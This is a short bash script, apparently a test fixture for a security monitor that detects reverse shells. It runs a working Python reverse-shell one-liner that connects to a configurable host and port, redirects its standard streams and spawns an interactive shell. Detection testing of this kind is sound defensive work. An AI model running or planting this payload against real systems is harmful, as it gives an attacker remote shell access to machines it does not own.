#!/bin/bash
# Attack: Python reverse shell using real syscalls
# Purpose: Execute reverse shell for Grimoire detection testing
# Expected: Guardian should detect socket()->dup2()->dup2()->execve() pattern

TARGET_IP="${1:-127.0.0.1}"
TARGET_PORT="${2:-4444}"

echo "🔥 Executing Python reverse shell attack..."
echo "   Target: $TARGET_IP:$TARGET_PORT"
echo "   (This should trigger Grimoire pattern: reverse_shell_classic)"
echo ""

python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$TARGET_IP',$TARGET_PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])"
